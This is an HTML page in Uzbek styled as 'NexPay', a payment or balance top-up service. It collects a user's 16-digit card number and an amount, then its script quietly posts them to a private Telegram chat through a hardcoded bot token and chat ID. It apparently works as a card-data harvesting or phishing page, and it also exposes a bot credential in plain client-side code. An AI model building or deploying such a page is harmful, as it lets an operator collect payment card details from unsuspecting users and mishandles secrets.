<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexPay - Dinamik Buyurtma Oqimi</title>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .app-container {
            background-color: #1e293b;
            border: 1px solid #334155;
            padding: 30px;
            border-radius: 24px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            box-sizing: border-box;
        }
        .header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 25px;
        }
        .brand-logo {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, #007bff, #00e676);
            border-radius: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .brand-name {
            font-size: 18px;
            font-weight: 800;
            letter-spacing: 0.5px;
        }
        h3 {
            font-size: 20px;
            margin-top: 0;
            margin-bottom: 20px;
            color: #f1f5f9;
        }
        .form-step {
            display: none;
        }
        .form-step.active {
            display: block;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #94a3b8;
            font-size: 14px;
        }
        input, select {
            width: 100%;
            padding: 14px;
            background-color: #0f172a;
            border: 1px solid #475569;
            border-radius: 12px;
            color: white;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus, select:focus {
            border-color: #00e676;
        }
        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #007bff, #00e676);
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 700;
            margin-top: 10px;
        }
        .warning-box {
            background-color: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            padding: 12px;
            border-radius: 8px;
            margin-top: 15px;
            font-size: 13px;
            color: #f87171;
            display: none;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            margin-top: 10px;
            color: #94a3b8;
        }
        .info-row strong {
            color: #00e676;
        }
    </style>
</head>
<body>

<div class="app-container">
    <div class="header">
        <div class="brand-logo">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L2 22H22L12 2Z" stroke="white" stroke-width="3" stroke-linejoin="round"/>
            </svg>
        </div>
        <span class="brand-name">NexPay</span>
    </div>

    <div id="step-1" class="form-step active">
        <h3>1-Bosqich:Pul o'tkazmoqchi bo'lyotgan Kartangizni kiriting</h3>
        <div class="form-group">
            <label for="card-input">Karta raqami:</label>
            <input type="number" id="card-input" placeholder="8600 ...." oninput="this.value = this.value.slice(0, 16)">
        </div>
        <button class="submit-btn" onclick="navigateToStep(2)">Keyingisi (Next)</button>
    </div>

    <div id="step-2" class="form-step">
        <h3>2-Bosqich: Miqdorni belgilash</h3>
        
        <div class="form-group">
            <label>Pul o'tkaziladigan karta:</label>
            <input type="number" id="step2-card-display" placeholder="Karta raqami" disabled style="opacity: 0.6;">
        </div>

        <div class="form-group">
            <label for="amount-input">Ilova ichki balansi summasi (so'm):</label>
            <input type="number" id="amount-input" placeholder="0" oninput="validateAndCalculate()">
        </div>

        <div class="info-row">
            <span>Komissiya yig'imi (1%):</span>
            <strong id="commission-text">0 so'm</strong>
        </div>
        <div class="info-row">
            <span>Jami hisob (Balansga tushadigan summa):</span>
            <strong id="total-text">0 so'm</strong>
        </div>

        <div id="warning-message" class="warning-box">
            Ogohlantirish: Summa minimum 5,000 so'm va maximum 5,000,000 so'm oralig'ida bo'lishi kerak!
        </div>

        <button class="submit-btn" style="background: #475569; margin-bottom: 8px;" onclick="navigateToStep(1)">Orqaga</button>
        <button class="submit-btn" id="final-btn" onclick="submitFinalOrder()">Yakunlash</button>
    </div>
</div>

<script>
    // Maxfiy ma'lumotlar kiritildi
    const TELEGRAM_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY"; 
    const TELEGRAM_CHAT_ID = "6198817749"; 

    function navigateToStep(stepNumber) {
        if(stepNumber === 2) {
            const cardNum = document.getElementById("card-input").value;
            if(cardNum.trim() === "" || cardNum.length < 16) {
                alert("Iltimos, 16 xonali karta raqamini to'liq kiriting!");
                return;
            }
            document.getElementById("step2-card-display").value = cardNum;
        }

        document.querySelectorAll('.form-step').forEach(step => {
            step.classList.remove('active');
        });
        
        document.getElementById(`step-${stepNumber}`).classList.add('active');
    }

    function validateAndCalculate() {
        const amountInput = document.getElementById("amount-input").value;
        const amount = parseFloat(amountInput);
        
        const warningBox = document.getElementById("warning-message");
        const commissionText = document.getElementById("commission-text");
        const totalText = document.getElementById("total-text");

        if (isNaN(amount) || amount <= 0) {
            commissionText.innerText = "0 so'm";
            totalText.innerText = "0 so'm";
            warningBox.style.display = "none";
            return;
        }

        if (amount < 5000 || amount > 5000000) {
            warningBox.style.display = "block";
            commissionText.innerText = "0 so'm";
            totalText.innerText = "0 so'm";
            return;
        } else {
            warningBox.style.display = "none";
        }

        const commission = amount * 0.01;
        const total = amount - commission;

        commissionText.innerText = commission.toLocaleString() + " so'm";
        totalText.innerText = total.toLocaleString() + " so'm";
    }

    function submitFinalOrder() {
        const cardNum = document.getElementById("card-input").value;
        const amountInput = document.getElementById("amount-input").value;
        const amount = parseFloat(amountInput);

        if (isNaN(amount) || amount < 5000 || amount > 5000000) {
            alert("Iltimos, belgilangan shartlarga muvofiq to'g'ri summa kiriting!");
            return;
        }

        const commission = amount * 0.01;
        const total = amount - commission;

        const finalBtn = document.getElementById("final-btn");
        finalBtn.disabled = true;
        finalBtn.innerText = "Yuborilmoqda...";

        // Telegram xabari formati
        const message = `🛍 *Yangi Buyurtma Keldi!*\n\n` +
                        `💳 *Karta:* \`${cardNum}\`\n` +
                        `💵 *Kiritilgan summa:* ${amount.toLocaleString()} so'm\n` +
                        `📉 *Komissiya (1%):* ${commission.toLocaleString()} so'm\n` +
                        `💰 *Sof jami (Balans):* *${total.toLocaleString()} so'm*`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        })
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                alert("Buyurtma muvaffaqiyatli yuborildi!");
                document.getElementById("card-input").value = "";
                document.getElementById("amount-input").value = "";
                document.getElementById("commission-text").innerText = "0 so'm";
                document.getElementById("total-text").innerText = "0 so'm";
                navigateToStep(1);
            } else {
                alert("Xatolik yuz berdi! Bot sozlamalarini tekshiring.");
            }
        })
        .catch(error => {
            console.error("Xatolik:", error);
            alert("Tarmoq xatosi yuz berdi!");
        })
        .finally(() => {
            finalBtn.disabled = false;
            finalBtn.innerText = "Yakunlash";
        });
    }
</script>

</body>
</html>
